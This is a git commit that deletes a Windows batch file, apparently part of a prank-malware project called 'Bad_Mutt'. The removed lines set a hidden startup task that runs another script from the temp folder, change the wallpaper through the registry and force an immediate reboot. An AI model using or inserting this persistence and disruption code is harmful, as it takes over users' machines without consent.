3e87ccd60ffa52cbbe98f9c463db7a8d9fc48c70
NOCRUF <118448383+NOCRUF@users.noreply.github.com>
2025-03-14 10:12:24 -0700

    Delete cleansing.bat

--- cleansing.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-schtasks /create /sc ONSTART /tn Cleansing /tr %TEMP%\Bad_Mutt-0.1\Revanant.bat
-
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\Bad_Mutt-0.1\uh.png" /f
-
-
-shutdown /r /t 2 /c "BAD DOG!"
